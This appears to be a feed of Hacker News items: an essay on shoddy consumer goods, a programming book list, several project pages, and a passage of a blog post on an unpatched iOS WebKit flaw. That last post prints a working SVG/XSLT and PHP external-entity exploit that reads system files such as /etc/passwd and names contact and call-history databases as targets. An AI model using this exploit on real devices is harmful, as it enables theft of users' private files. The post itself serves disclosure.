data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:228,&quot;width&quot;:221,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:8853,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; About five years ago, for seven dollars, I bought an old citrus juicer at a thrift shop.&nbsp; It was one of those vintage small appliances which seem built to survive gas explosions and hammer attacks. When I turned on the motor with a metal toggle switch, a drive shaft spun a heavy ceramic knob that gouged out the hearts of lemon and orange halves, leaving not a scrap of pulp uncrushed. The thing worked beautifully, almost like new, so I looked up its serial number on the internet to see when the unit was manufactured, guessing it might be almost forty years old. Wrong. It dated to the 1940s. It was seventy, the stubborn monster, still giving satisfaction with every use.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I can’t say the same about my coffee grinders. I use the plural because I’ve owned a lot of them, all bought in their original packaging and dead within a year. They’re good ones, supposedly, with burrs not blades, but they stop performing before long, ending their long journeys from overseas factories in unmarked graves in my local Montana landfill. I have a whole ghost kitchen in this landfill, and soon I will need to reserve a bigger plot. For the nifty under-the-counter fridge that has stopped getting cold after three years and which no one in the area can fix. For the cool bagless vacuum cleaner that clogs and chokes when I run it over a rug. For the set of glass measuring cups whose numbers and hashmarks are swiftly fading and becoming illegible, much like those on the dials of the washer my wife bought just three years ago. For the remains of the Pyrex casserole that shattered when I removed it from the oven, strewing the floor with blade-like shards, some so tiny I probably won’t find them until they lodge in my bare feet.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Should I go on? I think I will. It’s important to get to the thoughtful, speculative part, where I ask what it means when the objects in our lives demoralize us in a blizzard of malfunctions, but it’s also important – to me, emotionally -- to bury the reader in details of the unceasing material disappointments I’ve faced &nbsp;&nbsp;The cute yellow mittens my wife picked up at Target which unraveled the second time she wore them. The new suitcase which won’t stand upright when it’s full. The laptop computers that have turned to bricks within months of their warranties expiring. And the hybrid sedan with fifty thousand miles on it that also turned into a brick while going eighty down the freeway, losing its power steering, its power brakes, its power everything. I survived, by some miracle, issued legal threats, and the car’s manufacturer repaired it, free. Then it bricked again a few weeks later.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; It’s the little things too, of course, because they’re constant. The staples that won’t pierce five stacked sheets of paper. The matches that sizzle and smoke but don’t catch fire. The grocery bags split by the corners of the milk cartons whose inadequately seals leak drops of milk. The strangely short power cords on electronics. The two or three new pens I use each week that, because no ink comes out of them (at least not continually, in lines) aren’t really pens at all, in fact, but tributes to pens, Potemkin pens, mere props.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Baffled by how to measure this decline in the quality of common wares – a decline whose significance I promise to cover once I’ve further gratified my rage -- I opened the matter to my Twitter audience and quickly garnered two thousand replies, by far the longest thread I’ve ever triggered. The complaints were specific and formed patterns. One was a loathing for newer washers and dryers, because they don’t wash or dry well, and then they break. The clothes that go inside them were disliked too. (A former top executive of Levi’s chimed in to confirm that jeans aren’t what they used to be.) My favorite replies were the picky ones. One person noted that the “juice content” of juice is going down. Another observed that the “foaming liquid hand soap” which suddenly is dominating store shelves is just normal liquid soap, diluted.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Many blamed these problems on the government. They believed it had crippled certain products (major home appliances especially) with environmental regulations, causing them to function poorly and turn rapidly to landfill fodder -- an ecological net loss, perhaps. Some folks blamed our trade arrangements with China and the evils of capitalism itself. Weak-link computer chips in items that don’t require them also came in for abuse. One philosophical reply spoke of a sinister general trend toward the degradation of everything human. “There’s a war on value that’s going that’s comprised of three parts: war on quality, war on money, war on life.” Lofty rhetoric, but I understood. When my suddenly de-electrified hybrid car became a hurtling giant stone inside which my wife and I were helplessly strapped – all for the crime of trying to save fuel and, ultimately, earth-- it was hard not to feel ambushed, tricked.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Only a couple of my correspondents challenged my premise – and the flood of testimony -- that stuff is getting crappier, acutely so. They made an economic argument. They claimed things are worse because we want them cheaper, but if price is adjusted for inflation, they’re of the same quality as always. These rant-killing sophisticates annoyed me. Our new washing machine with the faded dials and the vanishing enamel on its corners (I forgot to mention that defect) is the costliest model we’ve ever purchased. As for the much of the cheap stuff – those Target mittens, say – they aren’t merely inexpensive, they’re valueless. In fact, they’re of negative value when one considers the waste or materials involved, and the wasted energy of driving to buy them, then driving to return them later – a second trip that in this case, and many others, wasn’t worth making. Instead, we took the loss. And the world took the loss. A small one, but they add up.</p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; In England in the 19</span><sup>th</sup><span> Century there arose certain thinkers – John Ruskin, William Morris – who believed that the quality of material objects reflects and affects the quality of society, even of the spirit. “Have nothing in your home,” wrote Morris, the father of the Arts and Crafts movement, which aimed to elevate the lives of the working and middle classes, “that you do not know to be useful or believe to be beautiful.” This would be a tall order nowadays. Recently, my wife needed a carrot peeler. She needed one rather quickly. Off to Target. The one she bought (the only one on sale) looked handsome enough, and the brand was one she recognized, but it failed in the useful department, miserably. It wasn’t sharp enough to peel a carrot. Like my pens which aren’t pens because pens put ink on paper, her peeler which didn’t peel was a nullity, a simulacrum, a representation of something, not the thing.</span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The world is going digital, we’re told, and someday there will even be digital real estate inhabited by people in digital clothes drinking digital orange juice extracted with digital juicers. &nbsp;People will play at the lives they once took seriously, lives that had once had heft and weight, and the juice content of juice will fall to zero. I suspect my old physical squeezer will still be working then, but the rest of my kitchen gear won’t. Not much of it. I might not last, either. I fear I won’t. The psychic toll of goods that don’t endure is that one loses faith that future will even come, and then one loses interest in it coming, for little that we own or use or cherish seems likely to be there with us to meet it.</p><p>             One wonders whose obsolescence is being planned, our products’ or our own?</p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Book list for streetfighting computer scientists (2022) (117 pts)]]></title>
            <link>https://nick-black.com/dankwiki/index.php/Book_list_for_streetfighting_computer_scientists</link>
            <guid>38789332</guid>
            <pubDate>Thu, 28 Dec 2023 02:33:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nick-black.com/dankwiki/index.php/Book_list_for_streetfighting_computer_scientists">https://nick-black.com/dankwiki/index.php/Book_list_for_streetfighting_computer_scientists</a>, See on <a href="https://news.ycombinator.com/item?id=38789332">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="mw-content" role="main"><p>From dankwiki</p><div id="bodyContent" lang="en" dir="ltr"><figure typeof="mw:File/Thumb"><a href="https://nick-black.com/dankwiki/index.php/File:Dijkstra.jpg"><img src="https://nick-black.com/dankwiki/images/thumb/a/ad/Dijkstra.jpg/300px-Dijkstra.jpg" decoding="async" width="300" height="343" srcset="https://nick-black.com/dankwiki/images/a/ad/Dijkstra.jpg 1.5x"></a><figcaption>Edsger Dijkstra is watching you</figcaption></figure>
<p>2022 edition. this is very different from most "best books for programmers" lists you'll see, with <i>Code Complete</i> and <i>Clean Code</i> and <i>Wistful Wanking for Practical Wankers</i> and <i>Design Slatterns</i> and titles like that. you'll figure all that out as you go along. these are books to read so that you can cut motherfuckers with knives. do you need to read all of these? only if you want to know the things inside, i guess.
</p>
<ul><li>Dijkstra, A Discipline of Programming</li>
<li>Knuth, The Art of Computer Programming, especially volumes 1 and 4B</li>
<li>Warren, Hacker's Delight</li>
<li>Stevens, Advanced Programming in the UNIX Environment</li>
<li>Stevens, UNIX Network Programming</li>
<li>Abelson + Sussman, Structure and Interpretation of Computer Programs</li>
<li>Varghese, Networking Algorithmics</li>
<li>McKusick, The Design and Implementation of the FreeBSD Operating System</li>
<li>Kerrisk, The Linux Programming Interface</li>
<li>Stroustrup, The C++ Programming Language</li>
<li>Gustedt, Modern C</li>
<li>Hanson, C Interfaces and Implementations</li>
<li>Garcia + Widjaja, Communications Networks</li>
<li>Kleinrock, Queueing Systems, especially volume 1</li>
<li>Hennessy + Paterson, Computer Architecture: A Quantitative Approach</li>
<li>Kennedy, Optimizing Compilers for Modern Architectures</li>
<li>Stepanov, From Mathematics to Generic Programming</li>
<li>CLRS, Introduction to Algorithms</li>
<li>Samet, Metric and Multidimensional Data Structures</li>
<li>McKenney, Is Parallel Programming Hard, And, If So, What Can You Do About It</li>
<li>Crochemere et al, Algorithms on Strings</li>
<li>Culler et al, Parallel Computer Architecture</li>
<li>Ward + Halstead, Computation Structures</li>
<li>Shriver + Smith, The Anatomy of a High-Performance Microprocessor</li>
<li>Vazirani, Approximation Algorithms</li>
<li>Raghaven + Motwani, Randomized Algorithms</li>
<li>Sipser, Introduction to the Theory of Computation</li>
<li>Ahora + Barak, Computational Complexity</li>
<li>Pierce, Types and Programming Languages</li>
<li>Barendregt, The Lambda Calculus</li>
<li>Okasaki, Purely Functional Data Structures</li>
<li>Van Roy + Hardidi, Concepts, Techniques, and Models of Computer Programming</li>
<li>Galub + Van Loan, Matrix Computations (note that this last is pretty much a straight mathematics textbook, but roaming multiethnic gangs of matrices make up many streetfights)</li></ul>
<p>speaking of math, you might want to take a look at Axler's <i>Linear Algebra Done Right</i> and Knuth's <i>Concrete Mathematics</i>. you'll want to know your combinatorics, your prob/stats, and your linear algebra cold. calculus through diffeqs is necessary to know, but i'm a pretty hardcore nerd and yet don't find myself integrating things all that often.
</p><p>now go forth and <a rel="nofollow" href="https://www.youtube.com/watch?v=BUt0dZXPFoU">fight in the streets</a>. i list no machine learning because i dislike machine learning. there are no quantum books because quantum is not yet useful for streetfighting (we all look forward to this situation changing). i list no SIMT/accelerator books because they're all shite. i list no infosec because infosec is a subfield of QA, fight me. there are no links because i'm a lazy, lazy man.
</p><p>i've heard good things about Tim Roughgarden's algorithms books, and have them on my shelves to read soon, but cannot yet speak to them.
</p><p>you should of course also read <a rel="nofollow" href="https://www.amazon.com/Hacking-Planet-Notcurses-Character-Graphics/dp/B086PNVNC9">Hacking the Planet with Notcurses</a>, buying copies for your team and family.
</p>
<!-- 
NewPP limit report
Cached time: 20231228063244
Cache expiry: 86400
Reduced expiry: false
Complications: [no‐toc‐conversion]
CPU time usage: 0.007 seconds
Real time usage: 0.007 seconds
Preprocessor visited node count: 1/1000000
Post‐expand include size: 0/2097152 bytes
Template argument size: 0/2097152 bytes
Highest expansion depth: 1/100
Expensive parser function count: 0/100
Unstrip recursion depth: 0/20
Unstrip post‐expand size: 0/5000000 bytes
-->
<!--
Transclusion expansion time report (%,ms,calls,template)
100.00%    0.000      1 -total
-->

<!-- Saved in parser cache with key wikidb:pcache:idhash:1434-0!canonical and timestamp 20231228063247 and revision id 10434. Rendering was triggered because: edit-page
 -->
</div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Game-icons.net: Free icons for your games (278 pts)]]></title>
            <link>https://game-icons.net/</link>
            <guid>38788552</guid>
            <pubDate>Thu, 28 Dec 2023 00:28:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://game-icons.net/">https://game-icons.net/</a>, See on <a href="https://news.ycombinator.com/item?id=38788552">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content"><main><h2><a href="https://game-icons.net/feeds/icons.xml"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/rss.svg" alt="rss icon" width="24" height="24"></a> Last Update Dec 20, 2022 | <a href="https://game-icons.net/recent.html">Recent icons</a></h2><h2>Popular ones with random colors</h2><ul><li data-hint="Robber"><p><a href="https://game-icons.net/1x1/delapouite/robber.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/robber.svg" alt="Robber icon" width="120" height="120"></a></p></li><li data-hint="Triton head"><p><a href="https://game-icons.net/1x1/lorc/triton-head.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/triton-head.svg" alt="Triton head icon" width="120" height="120"></a></p></li><li data-hint="Shark bite"><p><a href="https://game-icons.net/1x1/delapouite/shark-bite.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/shark-bite.svg" alt="Shark bite icon" width="120" height="120"></a></p></li><li data-hint="Glass heart"><p><a href="https://game-icons.net/1x1/lorc/glass-heart.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/glass-heart.svg" alt="Glass heart icon" width="120" height="120"></a></p></li><li data-hint="Drop weapon"><p><a href="https://game-icons.net/1x1/skoll/drop-weapon.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/skoll/drop-weapon.svg" alt="Drop weapon icon" width="120" height="120"></a></p></li><li data-hint="Winged sword"><p><a href="https://game-icons.net/1x1/lorc/winged-sword.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/winged-sword.svg" alt="Winged sword icon" width="120" height="120"></a></p></li><li data-hint="Ship's wheel"><p><a href="https://game-icons.net/1x1/delapouite/ship-wheel.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/ship-wheel.svg" alt="Ship's wheel icon" width="120" height="120"></a></p></li><li data-hint="Fishing"><p><a href="https://game-icons.net/1x1/delapouite/fishing.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/fishing.svg" alt="Fishing icon" width="120" height="120"></a></p></li><li data-hint="Angler fish"><p><a href="https://game-icons.net/1x1/lorc/angler-fish.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/angler-fish.svg" alt="Angler fish icon" width="120" height="120"></a></p></li><li data-hint="Bowling Strike"><p><a href="https://game-icons.net/1x1/delapouite/bowling-strike.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/bowling-strike.svg" alt="Bowling Strike icon" width="120" height="120"></a></p></li><li data-hint="Vine leaf"><p><a href="https://game-icons.net/1x1/lorc/vine-leaf.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/vine-leaf.svg" alt="Vine leaf icon" width="120" height="120"></a></p></li><li data-hint="Missile swarm"><p><a href="https://game-icons.net/1x1/lorc/missile-swarm.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/missile-swarm.svg" alt="Missile swarm icon" width="120" height="120"></a></p></li><li data-hint="Andromeda chain"><p><a href="https://game-icons.net/1x1/lorc/andromeda-chain.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/andromeda-chain.svg" alt="Andromeda chain icon" width="120" height="120"></a></p></li><li data-hint="Sword clash"><p><a href="https://game-icons.net/1x1/lorc/sword-clash.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/sword-clash.svg" alt="Sword clash icon" width="120" height="120"></a></p></li><li data-hint="Dungeon light"><p><a href="https://game-icons.net/1x1/delapouite/dungeon-light.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/dungeon-light.svg" alt="Dungeon light icon" width="120" height="120"></a></p></li><li data-hint="Cyborg face"><p><a href="https://game-icons.net/1x1/delapouite/cyborg-face.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/cyborg-face.svg" alt="Cyborg face icon" width="120" height="120"></a></p></li><li data-hint="Fangs"><p><a href="https://game-icons.net/1x1/skoll/fangs.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/skoll/fangs.svg" alt="Fangs icon" width="120" height="120"></a></p></li><li data-hint="Gold mine"><p><a href="https://game-icons.net/1x1/delapouite/gold-mine.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/gold-mine.svg" alt="Gold mine icon" width="120" height="120"></a></p></li><li data-hint="Castle"><p><a href="https://game-icons.net/1x1/lorc/castle.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/castle.svg" alt="Castle icon" width="120" height="120"></a></p></li><li data-hint="Diamonds smile"><p><a href="https://game-icons.net/1x1/lorc/diamonds-smile.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/diamonds-smile.svg" alt="Diamonds smile icon" width="120" height="120"></a></p></li></ul><h2>About the project</h2><h3>An ever growing collection of free game icons</h3><p>Dozen new symbols are added weekly and organized in intuitive categories to offer both a comfy browsing and let room for serendipity.</p><p>Stay up to date by following <a href="https://twitter.com/GameIcons">the project on twitter</a> or just fetching the <a href="https://game-icons.net/feeds/icons.xml">RSS feed</a>.</p><h3>Easy styling thanks to SVG</h3><p>All the images are downloadable in a vector format, so <a href="https://game-icons.net/studio.html">you can easily tweak</a> colors, rotation, adjust effects like blur, bevels or shadows and add <a href="https://game-icons.net/badges.html">badges</a>.</p><p>Another direct benefit is infinite scaling with low <a href="https://game-icons.net/memory.html">memory</a>, it means no size limit for the resulting files which can be used for high resolution interfaces, retina display, logos, stencils etc...</p><h3>Community oriented</h3><p>People designing video games or enthusiasts crafting board games have different constraints and needs.</p><p>Let us know what they are on our <a href="https://github.com/game-icons/icons/issues">GitHub tracker</a>.</p><h3>Passion driven</h3><p>Made by <a href="https://game-icons.net/about.html#authors">guys</a> who care about delivering a neat experience, because they eat their own dog food.</p><p><a href="https://game-icons.net/about.html">Learn more...</a></p></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Breaking "DRM" in Polish trains [video] – 37c3 presentation (326 pts)]]></title>
            <link>https://streaming.media.ccc.de/37c3/relive/12142</link>
            <guid>38788360</guid>
            <pubDate>Wed, 27 Dec 2023 23:56:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://streaming.media.ccc.de/37c3/relive/12142">https://streaming.media.ccc.de/37c3/relive/12142</a>, See on <a href="https://news.ycombinator.com/item?id=38788360">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
					<h3>Download</h3>
					<p>Click here to <a href="https://cdn.c3voc.de/relive/37c3/12142/muxed.mp4">Download</a> this Relive recording. Beware! This is an unprocessed streamdump – a final release will follow soon.</p>
				</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Valetudo – Cloud replacement for vacuum robots enabling local-only operation (391 pts)]]></title>
            <link>https://valetudo.cloud/</link>
            <guid>38788326</guid>
            <pubDate>Wed, 27 Dec 2023 23:51:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://valetudo.cloud/">https://valetudo.cloud/</a>, See on <a href="https://news.ycombinator.com/item?id=38788326">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>

      <p>
  <h2>Free your vacuum from the cloud</h2>
</p>

<p>Valetudo is an opinionated software solution for cloud-free vacuum robots installed on thousands of robots.<br>
Since it was started in 2018, it has matured to a reliable fire-and-forget solution that just works.</p>

<p>Valetudo is made, managed, maintained and more by me,
<a href="https://hypfer.de/" rel="noopener" target="_blank">Sören Beye</a>, with occasional contributions by
<a href="https://github.com/Hypfer/Valetudo/graphs/contributors" rel="noopener" target="_blank">these awesome people</a>.<br>
It would not exist without the ongoing work of <a href="https://dontvacuum.me/" rel="noopener" target="_blank">Dennis Giese</a>,
who is constantly providing us with new ways of liberating and gaining actual ownership of our robots.</p>

<p>As there is no telemetry built-in and no commercial interest to change that, I can’t tell you how many users exactly are there,
however judging by download counts and support group members, I’d guesstimate that there are a few thousand.</p>

<p>If you want to learn more about why someone would want to use something like Valetudo, check out the <a href="https://valetudo.cloud/pages/general/why-valetudo.html">Why Valetudo?</a> page.</p>

<p>If you want to learn more about why someone would <strong>not</strong> want to use something like Valetudo, check out the <a href="https://valetudo.cloud/pages/general/why-not-valetudo.html">Why not Valetudo?</a> page.</p>

<p>To choose the right robot to buy, head over to <a href="https://valetudo.cloud/pages/general/buying-supported-robots.html">Buying supported robots</a>.</p>

<p>If you want to learn more about why I’m building Valetudo, the answer is actually pretty simple:<br>
When I was looking for a vacuum robot for myself, I didn’t find anything that matched what I was looking for.<br>
Thus, in a brief moment of hubris, I thought to myself: “How hard can it be?”.<br>
Now, four years later, we’re here and I’m quite happy with how it turned out.</p>

<p>Valetudo is licensed under the Apache-2.0 open-source license, because you need to be able to know what your smart
devices are doing and also alter (some parts of) it without being dependent on some vendor and/or third party.
The only way of truly achieving that is by being able to see and modify the code.</p>

<p>The Apache-2.0 license is a very permissive license and a lot of work is being shared for free here, so I trust people to not take
advantage of that and sell Valetudo; especially not as their own work.<br>
Please don’t disappoint me. Thank you.</p>

<p>These are the Valetudo Docs.
Simply use the navigation menu on the left to find what you’re looking for.</p>

<p>The <a href="https://valetudo.cloud/pages/general/getting-started.html">getting started guide</a> is a good place to start.</p>

<p>Also, make sure to check out the companion apps section.</p>

<h3 id="screenshots">Screenshots</h3>

<h3 id="phonemobile">Phone/Mobile</h3>
<p><img src="https://user-images.githubusercontent.com/974410/211155741-d6430660-a6b2-48ab-8ddc-2217328444de.png" width="360">
<img src="https://user-images.githubusercontent.com/974410/211155635-fdfb5b2b-2c3d-4a49-a0ed-a40deb04708f.png" width="360"></p>

<p><img src="https://user-images.githubusercontent.com/974410/211155650-7cac266c-ffeb-432d-8656-5241a5d6f227.png" width="360">
<img src="https://user-images.githubusercontent.com/974410/211155656-d43ee25e-1ae6-432f-95ff-1a39d294828d.png" width="360"></p>

<h3 id="tabletdesktop">Tablet/Desktop</h3>

<p><img src="https://user-images.githubusercontent.com/974410/211155726-4ca46998-717a-49b4-a7d0-45b0467cc10a.png" alt="image"></p>

<p><img src="https://user-images.githubusercontent.com/974410/211155836-9199616a-efde-4238-91c4-24158ba67677.png" alt="image"></p>

<p><img src="https://user-images.githubusercontent.com/974410/211155860-9926b126-d1fe-41b1-8c83-1af21bf8caf2.png" alt="image"></p>

<p><img src="https://user-images.githubusercontent.com/974410/211155880-ff184776-86fe-4c2f-9556-4d556cfa12f4.png" alt="image"></p>

<h3 id="further-questions">Further questions?</h3>
<p><a href="https://t.me/+Wlt6LOE82dMwNmQy">Valetudo Telegram group</a></p>

<h3 id="valetudo-is-a-garden-">Valetudo is a garden <a id="garden"></a></h3>
<p>This project is the hobby of some random guy on the internet. There is no intent to commercialize it, grow it
or expand the target audience of it. In fact, there is intent to explicitly not do that.</p>

<p>Think of Valetudo as a privately-owned public garden. You can visit it any time for free and enjoy it.
You can spend time there, and you can bring an infinite amount of friends with you to enjoy it.
You can walk the pathways built there. You can sit on some patch of grass and maybe watch a Duck or something.
You can leave a tip in the tip jar at the entrance if you really enjoy it and want to support it flourish.</p>

<p>You can take inspiration from it and bring that home to your own garden, giving it a personal twist and adapting it as needed.
You can even make friendly suggestions if you have a really good idea that ties into the vision that is already there.</p>

<p>But, at the end of the day, you must understand that it is still privately-owned. You’re on someone else’s property
over which you have no power at all. You will have to show the necessary respect. And - most importantly - you need to
understand that letting you into this garden is a gift and should be treated as such.</p>

<p>If you don’t like this garden because you don’t like how it’s structured, or you feel like it’s missing something, or maybe
I choose the wrong flowers to plant over there that’s fine. It’s just not for you then. You can leave at any time.</p>

<p>There is simply no ground to stand on to demand change to the garden. It doesn’t matter if it would attract more people
or if all the other gardens in town are doing something in a specific way. It doesn’t matter if your idea of what gardens
even are differs.<br>
This at the end of the day is simply private property with free public access as a gift to everyone.</p>

<p>When it comes to software development, <em>everyone</em> has access to infinite plots of undeveloped land that they can claim at any time.
Therefore, a garden being build with a specific vision does not take away the ability for anyone else to build their own garden with a different vision.</p>


      </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[No new iPhone? No secure iOS: Looking at an unfixed iOS vulnerability (316 pts)]]></title>
            <link>https://joshua.hu/apple-ios-patched-unpatched-vulnerabilities</link>
            <guid>38788273</guid>
            <pubDate>Wed, 27 Dec 2023 23:43:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://joshua.hu/apple-ios-patched-unpatched-vulnerabilities">https://joshua.hu/apple-ios-patched-unpatched-vulnerabilities</a>, See on <a href="https://news.ycombinator.com/item?id=38788273">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
  <p>What’s the deal with iOS security updates, anyway?</p>

<p>Not everybody can afford the newest and greatest Apple product. Luckily, Apple continues to support nearly-decade-old devices like the iPhone 6S, which and iOS 15.8 is still powering those devices, seemingly with official Apple support, with the latest update from <a href="https://support.apple.com/en-gb/109032">October the 25th, which addressed some security vulnerabilities</a>.</p>

<p>In reality, however, Apple seems to only be addressing <em>some</em> security issues in its older supported devices.</p>

<hr>

<p>On June the 28th, Chromium announced that it had patched a vulnerability titled <a href="https://chromereleases.googleblog.com/2023/08/stable-channel-update-for-desktop_15.html">“CVE-2023-4357: Insufficient validation of untrusted input in XML”</a>. In the <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1458911">bug report</a> for that issue, it was shown that on various devices, Google Chrome’s Blink rendering engine could reveal the contents of arbitrary files: <code>/etc/passwd</code>, for example. Interestingly, this also included Chrome for iOS. Given that Apple forces all browsers in iOS to use the WebKit rendering engine, that meant this vulnerability not only affected Blink, but also WebKit.</p>

<hr>

<p>Taking that exploit from June:</p>

<p><code>exploit.svg</code>:</p>
<div><pre><code><span>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span>&lt;?xml-stylesheet type="text/xsl" href="?#"?&gt;</span>
<span>&lt;xsl:stylesheet</span> <span>version=</span><span>"1.0"</span> <span>xmlns:xsl=</span><span>"http://www.w3.org/1999/XSL/Transform"</span><span>&gt;</span>

<span>&lt;xsl:template</span> <span>match=</span><span>"/"</span><span>&gt;</span>

<span>&lt;svg</span> <span>width=</span><span>"1000%"</span> <span>height=</span><span>"1000%"</span> <span>version=</span><span>"1.1"</span> <span>xmlns=</span><span>"http://www.w3.org/2000/svg"</span><span>&gt;</span>
<span>&lt;foreignObject</span> <span>class=</span><span>"node"</span> <span>font-size=</span><span>"18"</span> <span>width=</span><span>"100%"</span> <span>height=</span><span>"100%"</span><span>&gt;</span>
<span>&lt;body</span> <span>xmlns=</span><span>"http://www.w3.org/1999/xhtml"</span><span>&gt;</span>
<span>&lt;xmp&gt;&lt;xsl:copy-of</span> <span>select=</span><span>"document('exploit.php')"</span><span>/&gt;&lt;/xmp&gt;</span>
<span>&lt;/body&gt;</span>
<span>&lt;/foreignObject&gt;</span>
<span>&lt;/svg&gt;</span>

<span>&lt;/xsl:template&gt;</span>
<span>&lt;/xsl:stylesheet&gt;</span>
</code></pre></div>

<p><code>exploit.php</code>:</p>
<div><pre><code><span>&lt;?php</span> <span>header</span><span>(</span><span>"Access-Control-Allow-Origin: *"</span><span>);</span><span>?&gt;</span>
<span>&lt;!DOCTYPE p [
&lt;!ENTITY passwd SYSTEM "file:///etc/passwd"&gt;</span>
<span>&lt;</span><span>!</span><span>ENTITY</span> <span>hosts</span> <span>SYSTEM</span> <span>"</span><span>file:</span><span>///</span><span>etc</span><span>/</span><span>hosts</span><span>"</span><span>&gt;</span>
<span>&lt;</span><span>!</span><span>ENTITY</span> <span>group</span> <span>SYSTEM</span> <span>"</span><span>file:</span><span>//</span><span>localhost</span><span>/</span><span>etc</span><span>/</span><span>group</span><span>"</span><span>&gt;</span>
]&gt;
<span>&lt;p&gt;</span>

<span>&lt;p</span> <span>style=</span><span>"border-style: dotted;"</span><span>&gt;</span>/etc/passwd:
<span>&amp;passwd;</span>
<span>&lt;/p&gt;</span>
<span>&lt;p</span> <span>style=</span><span>"border-style: dotted;"</span><span>&gt;</span>/etc/hosts:

<span>&amp;hosts;</span>
<span>&lt;/p&gt;</span>
<span>&lt;p</span> <span>style=</span><span>"border-style: dotted;"</span><span>&gt;</span>/etc/group:

<span>&amp;group;</span>
<span>&lt;/p&gt;</span>

<span>&lt;/p&gt;</span>
</code></pre></div>

<p>Aand trying it on the latest version of iOS that the (supported) iPhone 6S, we indeed see that the exploit <em>still</em> works. When opening the page, your <code>/etc/passwd</code> is there for the world to see.</p>

<p>That means that any website visited by anybody using an iPhone 6S (or possibly later versions) can silently steal internal system files. What files could somebody steal? Well, there’s always:</p>

<ul>
  <li>AddressBook.sqlitedb: which contains all of the personal contact information of the user and any saved contacts.</li>
  <li>call_history.db: which contains all received, dialled, and missed calls of the user.</li>
